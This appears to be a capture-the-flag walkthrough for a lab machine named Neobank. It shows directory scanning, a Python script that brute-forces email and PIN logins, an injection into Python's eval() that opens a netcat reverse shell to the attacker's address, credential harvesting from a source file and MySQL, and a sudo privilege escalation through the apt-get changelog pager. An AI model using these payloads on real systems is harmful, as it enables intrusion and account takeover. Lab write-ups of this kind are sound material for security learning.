# Neobank 

## Directory Scan
```console
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.121:5000/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
/login
/logout
/otp
/qr
/withdraw
/email_list
```
## Retreive emails
Under the /email_list you can retrieve the emails

## Brute force
```console
┌──(alienum㉿kali)-[~]
└─$ cat /usr/share/wordlists/rockyou.txt | grep "^[0-9]" > pins.txt

┌──(alienum㉿kali)-[~]
└─$ nano neobank-bf.py
import requests
import sys
url = 'http://10.0.2.121:5000/login'
with open('/home/alienum/Desktop/emails.txt') as users:
  for u in users:
    with open('/home/alienum/Desktop/pins.txt') as pins:
       for p in pins:
          user = {"email":u.strip(),"pin":p.strip()}
          r =  requests.post(url,data = user)
          if len(r.cookies) != 0:
             print('~~~~~~~~~~~~~~~~~~~')
             print('Credentials found!!')
             print('~~~~~~~~~~~~~~~~~~~')
             print('[+] Username : '+ u.strip())
             print('[+] Password : '+ p.strip())
             sys.exit()
             
┌──(alienum㉿kali)-[~]
└─$ python3 neobank-bf.py
[+] Username : z***@neobank.vln
[+] Password : 2*****
```
## OTP google authenticator
scan the qrcode and insert the otp code

## Exploit eval() python function 
```console
__import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
```
## MySQL enumeration find banker credentials
```console
cat /var/www/html/main.py
banker:neobank1
mysql -u banker -pneobank1
use bank;
select * from system;
banker:a********
```
## GTFObins
```console
sudo apt-get changelog apt
!/bin/sh
```
